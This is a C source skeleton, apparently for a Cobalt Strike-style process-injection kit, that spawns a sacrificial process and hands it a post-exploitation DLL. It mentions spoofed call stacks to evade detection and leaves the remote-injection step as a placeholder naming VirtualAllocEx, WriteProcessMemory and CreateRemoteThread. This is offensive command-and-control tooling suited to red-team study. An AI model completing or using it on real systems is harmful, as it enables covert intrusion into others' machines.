/*
 * Process Inject Kit — Spawn BOF Skeleton
 *
 * Beacon dispatches to PROCESS_INJECT_SPAWN when a sacrificial process
 * must be spawned for fork-and-run post-exploitation. This BOF receives
 * the ignoreToken flag and the post-exploitation DLL bytes.
 *
 * The injection technique is operator-defined. Any API used here that
 * the PICO hooks (VirtualAlloc, VirtualProtect, CreateRemoteThread)
 * inherits spoofed call stacks automatically.
 */

#include <windows.h>
#include "beacon.h"

BOOL is_x64() {
#if defined _M_X64
    return TRUE;
#elif defined _M_IX86
    return FALSE;
#endif
}

void go(char *args, int alen, BOOL x86) {
    datap parser;
    short ignoreToken;
    char *dllPtr;
    int   dllLen;
    STARTUPINFOA        si = {0};
    PROCESS_INFORMATION pi = {0};

    BeaconDataParse(&parser, args, alen);
    ignoreToken = BeaconDataShort(&parser);
    dllPtr      = BeaconDataExtract(&parser, &dllLen);

    /* spawn sacrificial process */
    if (!BeaconSpawnTemporaryProcess(x86, ignoreToken, &si, &pi)) return;

    /* remote-inject dllPtr into pi.hProcess via your technique:
       VirtualAllocEx + WriteProcessMemory + CreateRemoteThread, etc. */
    /* ... your injection technique here ... */

    /* close handles the BOF owns; postex DLL calls ExitThread/ExitProcess itself */
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}
